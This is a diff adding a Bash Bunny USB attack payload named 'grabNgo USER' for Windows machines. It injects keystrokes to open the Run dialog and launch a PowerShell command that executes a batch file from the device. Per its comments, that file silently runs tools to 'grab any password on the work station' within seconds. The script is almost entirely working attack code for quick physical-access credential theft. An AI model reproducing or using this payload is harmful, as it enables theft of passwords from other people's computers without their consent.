@@ -1,0 +1,28 @@
+#!/bin/bash
+#
+# Title:         grabNgo USER
+# Author:        PCnurse
+# Version:       1.0
+# Target:        Windows 7+
+# 
+# Executes d.cmd from the selected switch folder of the Bash Bunny USB Disk partition,
+# which in turn executes e.cmd invisibly using i.vbs
+# which in turn runs MrGraysRubberHack EXEs to grab any password on the work station
+# BashBunny loads in about 8 seconds, 5 Seconds to stage Bunny and script runs in about 2 seconds.
+# Total time to run about 15 - 20 seconds. Once you see the green light Grab and Go!
+
+#This version can be used if the target is just a user login, won't grab wifi passwords.
+
+#Staging Bunny' Sold Amber Light
+LED R G 
+ATTACKMODE HID STORAGE
+# Check for switch position
+source bunny_helpers.sh
+QUACK GUI r
+QUACK DELAY 200
+LED b 200
+QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\grabNgoUser\d.cmd')"
+QUACK ENTER
+QUACK DELAY 2000
+#Finished Grab N Go, Hop like a Bunny out of there. Green Light!!
+LED G
